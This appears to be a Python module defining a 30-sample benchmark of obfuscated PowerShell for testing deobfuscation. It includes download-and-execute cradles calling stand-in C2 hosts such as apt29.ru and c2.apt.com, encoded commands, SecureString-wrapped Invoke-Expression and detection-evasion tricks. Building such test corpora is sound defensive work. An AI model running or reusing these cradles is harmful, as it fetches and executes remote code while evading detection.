"""
PowerShell Obfuscation Benchmark Corpus.
Curated collection of 30 representative real-world obfuscated PowerShell samples
spanning 10 distinct evasion categories for automated fidelity evaluation.
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from .secure_string_crypto import encrypt_secure_string


@dataclass
class CorpusSample:
    """
    Data model representing a single obfuscated PowerShell benchmark sample.
    """
    id: str
    name: str
    category: str
    description: str
    obfuscated_script: str
    expected_indicators: List[str]
    target_properties: Dict[str, Any] = field(default_factory=dict)


# Fixed 16-byte key for deterministic SecureString test sample generation
_STATIC_KEY_16 = bytes(range(1, 17))
_ENC_SEC_SAMPLE = encrypt_secure_string(
    "Invoke-Expression 'Get-Service -Name WinDefend'",
    _STATIC_KEY_16
)

import base64

# Base64 helper for authentic Windows PowerShell UTF-16LE encoded commands
def _encode_b64(cmd: str) -> str:
    return base64.b64encode(cmd.encode("utf-16le")).decode("ascii")


_B64_WHOAMI = _encode_b64("Invoke-Expression 'whoami'")
_B64_NESTED = _encode_b64(f"powershell.exe -enc {_B64_WHOAMI}")
_B64_CMD_CALC = _encode_b64("Start-Process 'cmd.exe' -ArgumentList '/c calc.exe'")


_BENCHMARK_CORPUS: List[CorpusSample] = [
    # -------------------------------------------------------------------------
    # Category 1: String Concat & Backticks
    # -------------------------------------------------------------------------
    CorpusSample(
        id="SAMPLE-01",
        name="Backtick Evasion in Command and Arguments",
        category="String Concat & Backticks",
        description="Obfuscates Invoke-Expression and Get-Process using inline backtick escape evasion.",
        obfuscated_script="In`voke-Exp`ression 'Get-Pro`cess'",
        expected_indicators=["Invoke-Expression", "Get-Process"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "backtick_insertion",
            "complexity": "low",
        },
    ),
    CorpusSample(
        id="SAMPLE-02",
        name="Fragmented WebClient Stager Concatenation",
        category="String Concat & Backticks",
        description="Fragments New-Object and Net.WebClient with adjacent string concatenation and method call.",
        obfuscated_script=(
            "$wc = ('New-Ob' + 'ject') ('Net.Web' + 'Client'); "
            "$wc.('Down' + 'loadString')('http://c2.threat-actor.org/beacon.ps1')"
        ),
        expected_indicators=[
            "'New-Object'",
            "'Net.WebClient'",
            "'http://c2.threat-actor.org/beacon.ps1'",
        ],
        target_properties={
            "technique": "T1059.001",
            "evasion": "string_fragmentation",
            "complexity": "medium",
        },
    ),
    CorpusSample(
        id="SAMPLE-03",
        name="Backtick-Escaped Start-Process Execution",
        category="String Concat & Backticks",
        description="Executes payload via backtick-fragmented Start-Process with string concatenated parameters.",
        obfuscated_script="& ('In' + 'voke-Exp`ression') ('St`art-Pro' + 'cess' + ' ' + 'powershell.exe')",
        expected_indicators=["Invoke-Expression", "powershell.exe"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "call_operator_backticks",
            "complexity": "medium",
        },
    ),

    # -------------------------------------------------------------------------
    # Category 2: Format Operator Shuffle
    # -------------------------------------------------------------------------
    CorpusSample(
        id="SAMPLE-04",
        name="Format Operator Reordered IEX",
        category="Format Operator Shuffle",
        description="Reorders execution cradle tokens using PowerShell -f string formatting operator.",
        obfuscated_script="('{1}{0}' -f 'ex','i') ('whoami')",
        expected_indicators=["'iex'", "'whoami'"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "format_string_shuffle",
            "complexity": "low",
        },
    ),
    CorpusSample(
        id="SAMPLE-05",
        name="Format Operator DownloadString Reordering",
        category="Format Operator Shuffle",
        description="Constructs DownloadString method name via three-token format operator permutation.",
        obfuscated_script=(
            "$method = ('{0}{2}{1}' -f 'Down','String','load'); "
            "$url = 'http://10.0.0.1/stager.ps1'"
        ),
        expected_indicators=["'DownloadString'", "http://10.0.0.1/stager.ps1"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "method_token_permutation",
            "complexity": "medium",
        },
    ),
    CorpusSample(
        id="SAMPLE-06",
        name="Multi-Stage Format String Cradle",
        category="Format Operator Shuffle",
        description="Reconstructs cmdlet invocation and hidden arguments using multi-argument -f formatting.",
        obfuscated_script="('{0}{3}{1}{2}' -f 'Invoke','pres','sion','-Ex') ('cmd.exe /c calc.exe')",
        expected_indicators=["'Invoke-Expression'", "calc.exe"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "multi_arg_format_fold",
            "complexity": "medium",
        },
    ),

    # -------------------------------------------------------------------------
    # Category 3: Type Casting & Array Join
    # -------------------------------------------------------------------------
    CorpusSample(
        id="SAMPLE-07",
        name="Char Array Cast Join Evasion",
        category="Type Casting & Array Join",
        description="Generates IEX command string via char array cast and empty delimiter -join operator.",
        obfuscated_script="[char[]](105,101,120) -join '' + ' (whoami)'",
        expected_indicators=["iex", "whoami"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "char_array_join",
            "complexity": "medium",
        },
    ),
    CorpusSample(
        id="SAMPLE-08",
        name="Byte Array Ascii Cast Join",
        category="Type Casting & Array Join",
        description="Encodes cmdlet token Get-Process into numeric byte array resolved via [char[]].",
        obfuscated_script="[char[]](71,101,116,45,80,114,111,99,101,115,115) -join ''",
        expected_indicators=["'Get-Process'"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "ascii_numeric_encoding",
            "complexity": "medium",
        },
    ),
    CorpusSample(
        id="SAMPLE-09",
        name="Type Accelerator and Int Array Join",
        category="Type Casting & Array Join",
        description="Uses [string][char[]] composite type casting to reconstruct sensitive API identifier.",
        obfuscated_script="[string][char[]](68,111,119,110,108,111,97,100,83,116,114,105,110,103) -join ''",
        expected_indicators=["'DownloadString'"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "type_accelerator_composite",
            "complexity": "medium",
        },
    ),

    # -------------------------------------------------------------------------
    # Category 4: Index Shuffling & Reverse Slicing
    # -------------------------------------------------------------------------
    CorpusSample(
        id="SAMPLE-10",
        name="String Index Shuffling for Command Execution",
        category="Index Shuffling & Reverse Slicing",
        description="Picks characters out of sequence from an arbitrary decoy string to form iex.",
        obfuscated_script="'xixe'[1,3,0] -join ''",
        expected_indicators=["'iex'"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "index_permutation",
            "complexity": "medium",
        },
    ),
    CorpusSample(
        id="SAMPLE-11",
        name="Reverse Range Slicing for Download Method",
        category="Index Shuffling & Reverse Slicing",
        description="Applies reverse range slicing [13..0] over inverted method name string.",
        obfuscated_script="'gnirtSdaolnwoD'[13..0] -join ''",
        expected_indicators=["'DownloadString'"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "reverse_range_slice",
            "complexity": "medium",
        },
    ),
    CorpusSample(
        id="SAMPLE-12",
        name="Array Literal Reverse Slicing",
        category="Index Shuffling & Reverse Slicing",
        description="Inverts string token using negative index range and join.",
        obfuscated_script="'exe.clac'[7..0] -join ''",
        expected_indicators=["'calc.exe'"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "negative_slice_inversion",
            "complexity": "medium",
        },
    ),

    # -------------------------------------------------------------------------
    # Category 5: Special Environment & Preference Slicing
    # -------------------------------------------------------------------------
    CorpusSample(
        id="SAMPLE-13",
        name="COMSPEC Variable Slicing for IEX",
        category="Special Environment & Preference Slicing",
        description="Slices Windows %COMSPEC% environment variable at indices 4, 15, and 25 to extract iex.",
        obfuscated_script="$env:COMSPEC[4,15,25] -join ''",
        expected_indicators=["'iex'"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "environment_variable_slice",
            "complexity": "medium",
        },
    ),
    CorpusSample(
        id="SAMPLE-14",
        name="SYSTEMROOT Path Variable Inlining",
        category="Special Environment & Preference Slicing",
        description="Inlines system root path variable to build full executable path.",
        obfuscated_script="$env:SYSTEMROOT + '\\System32\\cmd.exe'",
        expected_indicators=["System32\\cmd.exe"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "environment_inlining",
            "complexity": "low",
        },
    ),
    CorpusSample(
        id="SAMPLE-15",
        name="VerbosePreference Variable Slicing",
        category="Special Environment & Preference Slicing",
        description="Extracts characters from preference variable to evade direct keyword detection.",
        obfuscated_script="$VerbosePreference[1,4] -join ''",
        expected_indicators=["'in'"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "preference_variable_slice",
            "complexity": "medium",
        },
    ),

    # -------------------------------------------------------------------------
    # Category 6: Reflection & Dynamic Member Invocation
    # -------------------------------------------------------------------------
    CorpusSample(
        id="SAMPLE-16",
        name="Dynamic Math Member Invocation",
        category="Reflection & Dynamic Member Invocation",
        description="Dynamically accesses .NET member via string literal reflection wrapper.",
        obfuscated_script="[System.Math].('Abs')(-42)",
        expected_indicators=["[System.Math].Abs", "-42"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "dynamic_member_call",
            "complexity": "medium",
        },
    ),
    CorpusSample(
        id="SAMPLE-17",
        name="Reflection String Concat Invocation",
        category="Reflection & Dynamic Member Invocation",
        description="Employs System.Reflection GetMethod and Invoke to construct executable command.",
        obfuscated_script="[System.String].GetMethod('Concat', [type[]]@([string], [string])).Invoke($null, @('cmd.', 'exe'))",
        expected_indicators=["'cmd.exe'"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "reflection_getmethod_invoke",
            "complexity": "high",
        },
    ),
    CorpusSample(
        id="SAMPLE-18",
        name="Dynamic Member Access on Object Instance",
        category="Reflection & Dynamic Member Invocation",
        description="Invokes Substring method on URL string using dynamic member access syntax.",
        obfuscated_script="('http://evil.com/test').('Substring')(7)",
        expected_indicators=["'evil.com/test'"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "instance_dynamic_member",
            "complexity": "medium",
        },
    ),

    # -------------------------------------------------------------------------
    # Category 7: Pipeline & ScriptBlock Control Flow
    # -------------------------------------------------------------------------
    CorpusSample(
        id="SAMPLE-19",
        name="Pipeline Stage Simplification for Execution",
        category="Pipeline & ScriptBlock Control Flow",
        description="Pipes command string directly into Invoke-Expression alias.",
        obfuscated_script="'Get-Service' | iex",
        expected_indicators=["iex 'Get-Service'"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "pipeline_command_pipe",
            "complexity": "low",
        },
    ),
    CorpusSample(
        id="SAMPLE-20",
        name="ForEach-Object Pipeline Char Conversion and Execution",
        category="Pipeline & ScriptBlock Control Flow",
        description="Converts integer array through pipeline % to construct iex command call.",
        obfuscated_script="$cmd = (105, 101, 120 | % { [char]$_ }) -join ''; & $cmd 'Get-Process'",
        expected_indicators=["'iex'", "Get-Process"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "pipeline_foreach_char_cast",
            "complexity": "high",
        },
    ),
    CorpusSample(
        id="SAMPLE-21",
        name="ScriptBlock Invocation Unwrapping",
        category="Pipeline & ScriptBlock Control Flow",
        description="Unwraps direct call operator invocation of encapsulated scriptblock.",
        obfuscated_script="& { Invoke-Item 'C:\\Windows\\Temp\\payload.exe' }",
        expected_indicators=["Invoke-Item", "payload.exe"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "scriptblock_call_operator",
            "complexity": "low",
        },
    ),

    # -------------------------------------------------------------------------
    # Category 8: Recursive Base64 Encoded Commands
    # -------------------------------------------------------------------------
    CorpusSample(
        id="SAMPLE-22",
        name="Single Layer Base64 Encoded Command",
        category="Recursive Base64 Encoded Commands",
        description="Standard powershell.exe -enc payload containing Invoke-Expression whoami.",
        obfuscated_script=f"powershell.exe -enc {_B64_WHOAMI}",
        expected_indicators=["Invoke-Expression", "whoami"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "base64_encoded_command",
            "complexity": "low",
        },
    ),
    CorpusSample(
        id="SAMPLE-23",
        name="Nested Double Base64 Encoded Command",
        category="Recursive Base64 Encoded Commands",
        description="Multi-stage nested Base64 encoded payload requiring multi-pass unraveling.",
        obfuscated_script=f"powershell.exe -EncodedCommand {_B64_NESTED}",
        expected_indicators=["Invoke-Expression", "whoami"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "nested_base64_recursion",
            "complexity": "high",
        },
    ),
    CorpusSample(
        id="SAMPLE-24",
        name="Base64 Command with ArgumentList Execution",
        category="Recursive Base64 Encoded Commands",
        description="Encoded payload invoking Start-Process with cmd.exe and calc arguments.",
        obfuscated_script=f"powershell.exe -e {_B64_CMD_CALC}",
        expected_indicators=["Start-Process", "cmd.exe", "calc.exe"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "short_flag_base64",
            "complexity": "medium",
        },
    ),

    # -------------------------------------------------------------------------
    # Category 9: Subexpressions & Casing Randomization
    # -------------------------------------------------------------------------
    CorpusSample(
        id="SAMPLE-25",
        name="Subexpression Unboxing and Flattening",
        category="Subexpressions & Casing Randomization",
        description="Deeply nested subexpressions wrapping critical cmdlet invocation.",
        obfuscated_script="$((('Stop-Computer -Force')))",
        expected_indicators=["Stop-Computer", "-Force"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "nested_subexpression_unboxing",
            "complexity": "low",
        },
    ),
    CorpusSample(
        id="SAMPLE-26",
        name="Randomized Casing Normalization on Cmdlet and Parameters",
        category="Subexpressions & Casing Randomization",
        description="Alternating uppercase and lowercase cmdlet, parameter flags and variables.",
        obfuscated_script="iNvOkE-eXpReSsIoN -cOmMaNd 'Get-Process powershell' -NoPrOfIlE",
        expected_indicators=["Invoke-Expression", "-Command", "-NoProfile", "Get-Process"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "casing_randomization",
            "complexity": "medium",
        },
    ),
    CorpusSample(
        id="SAMPLE-27",
        name="Subexpression Assignment Propagation and Variable Return",
        category="Subexpressions & Casing Randomization",
        description="Propagates variable assignment within subexpression and unwraps trailing result.",
        obfuscated_script="$($u = 'http://bad.org/rat.exe'; $u)",
        expected_indicators=["'http://bad.org/rat.exe'"],
        target_properties={
            "technique": "T1059.001",
            "evasion": "subexpression_assignment_inlining",
            "complexity": "medium",
        },
    ),

    # -------------------------------------------------------------------------
    # Category 10: Cryptographic Envelopes & Composite APT Cradles
    # -------------------------------------------------------------------------
    CorpusSample(
        id="SAMPLE-28",
        name="SecureString AES-CBC Envelope Unwrapping",
        category="Cryptographic Envelopes & Composite APT Cradles",
        description="Standard SecureString encryption envelope with static 16-byte key and Marshal BSTR unboxing.",
        obfuscated_script=(
            f"$enc = '{_ENC_SEC_SAMPLE}'\n"
            f"$key = 1..16\n"
            f"$sec = ConvertTo-SecureString $enc -Key $key\n"
            f"$cmd = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto("
            f"[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec))\n"
            f"Invoke-Expression $cmd"
        ),
        expected_indicators=["Invoke-Expression", "Get-Service", "WinDefend"],
        target_properties={
            "technique": "T1027",
            "evasion": "securestring_aes_cbc_envelope",
            "complexity": "high",
        },
    ),
    CorpusSample(
        id="SAMPLE-29",
        name="Composite APT Download Cradle with Format and Concat",
        category="Cryptographic Envelopes & Composite APT Cradles",
        description="Real-world composite cradle combining format operators, string concat, and dynamic Net.WebClient.",
        obfuscated_script=(
            "$d = ('{1}{0}' -f 'ex','i'); "
            "$u = ('http://apt29.ru/' + 'stage1.ps1'); "
            "& $d ((New-Object Net.WebClient).DownloadString($u))"
        ),
        expected_indicators=["'iex'", "http://apt29.ru/stage1.ps1", "DownloadString"],
        target_properties={
            "technique": "T1059.001",
            "threat_group": "APT29",
            "evasion": "composite_cradle_format_concat",
            "complexity": "high",
        },
    ),
    CorpusSample(
        id="SAMPLE-30",
        name="Composite Obfuscated C2 Beacon with Backticks and Dynamic WebClient",
        category="Cryptographic Envelopes & Composite APT Cradles",
        description="Combines backticks, string concatenation and dynamic WebClient download string execution.",
        obfuscated_script=(
            "$c = ('In`vok' + 'e-Ex`press' + 'ion'); "
            "$p = ('http://c2.apt.com/' + 'agent.ps1'); "
            "& $c ((New-Object Net.WebClient).DownloadString($p))"
        ),
        expected_indicators=["Invoke-Expression", "http://c2.apt.com/agent.ps1", "DownloadString"],
        target_properties={
            "technique": "T1059.001",
            "threat_group": "FIN7",
            "evasion": "composite_backticks_concat_webclient",
            "complexity": "high",
        },
    ),
]


def get_corpus() -> List[CorpusSample]:
    """
    Returns the complete 30-sample benchmark corpus.
    """
    return list(_BENCHMARK_CORPUS)


def get_sample(sample_id: str) -> Optional[CorpusSample]:
    """
    Retrieves a single sample from the corpus by its unique identifier.
    """
    normalized_id = sample_id.strip().upper()
    for sample in _BENCHMARK_CORPUS:
        if sample.id.upper() == normalized_id:
            return sample
    return None


def get_corpus_by_category(category: str) -> List[CorpusSample]:
    """
    Filters and returns all samples belonging to the specified evasion category.
    """
    normalized_cat = category.strip().lower()
    return [
        sample for sample in _BENCHMARK_CORPUS
        if sample.category.strip().lower() == normalized_cat
    ]
